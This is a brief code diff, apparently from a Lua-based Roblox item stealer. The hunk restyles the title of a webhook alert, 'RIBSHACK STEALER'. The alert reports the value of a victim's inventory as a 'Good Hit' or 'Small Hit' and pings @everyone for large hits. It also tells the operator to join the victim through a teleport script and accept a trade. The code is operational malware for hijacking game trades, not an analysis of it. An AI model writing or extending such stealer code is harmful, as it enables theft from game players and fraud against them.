@@ -126,7 +126,7 @@ local teleportScript = 'game:GetService("TeleportService"):TeleportToPlaceInstan
 local payload = {
     content = (totalValue >= 5.81 and "> @everyone " or "> ").."**"..(totalValue >= 5.81 and "Good Hit" or "Small Hit").." • Value: "..string.format("%.2f", totalValue).."**",
     embeds = {{
-        title = "ribshack stealer",
+        title = " 🍖 RIBSHACK STEALER 🍖",
         description = "<:faq_badge:1436328022910435370> **How to Use:** \n> > Join the user using Join Script or Join Link then type anything in chat and accept trade.\n⠀",
         color = 16711680,
         fields = {
